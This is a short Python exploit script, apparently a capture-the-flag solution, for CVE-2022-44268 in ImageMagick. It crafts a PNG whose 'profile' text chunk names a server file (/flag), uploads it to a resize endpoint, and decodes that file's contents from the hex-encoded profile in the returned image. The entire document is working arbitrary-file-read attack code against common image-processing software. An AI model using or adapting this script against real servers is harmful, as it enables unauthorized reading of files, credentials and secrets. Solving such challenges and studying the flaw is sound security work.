#!/usr/bin/env python3

# used version of imagemagick is vulnerable to CVE-2022-44268
# https://www.metabaseq.com/imagemagick-zero-days/

import io
import requests

from PIL import Image
from PIL.PngImagePlugin import PngInfo

TARGET_FILE = '/flag'
URL = 'http://localhost:1337/resize'

image = Image.new(mode='RGB', size=(1,1))

metadata = PngInfo()
metadata.add_text('profile', TARGET_FILE)

payload_stream = io.BytesIO()
image.save(payload_stream, format='PNG', pnginfo=metadata)
img_data = payload_stream.getvalue()
print(f'payload: {img_data}')

resp = requests.post(URL, data=img_data, headers={'Content-Type': 'image/png'})
print(resp.status_code)

print(resp.content)

result_stream = io.BytesIO(resp.content)
result_img = Image.open(result_stream)
raw_profile = result_img.info['Raw profile type']

print(raw_profile)

raw_profile = raw_profile.strip().split('\n')[1:]
raw_profile = ''.join(raw_profile)
read_file = bytes.fromhex(raw_profile)

print('file:')
print(read_file)
print()

try:
    print('decoded:\n' + read_file.decode())
except:
    ...
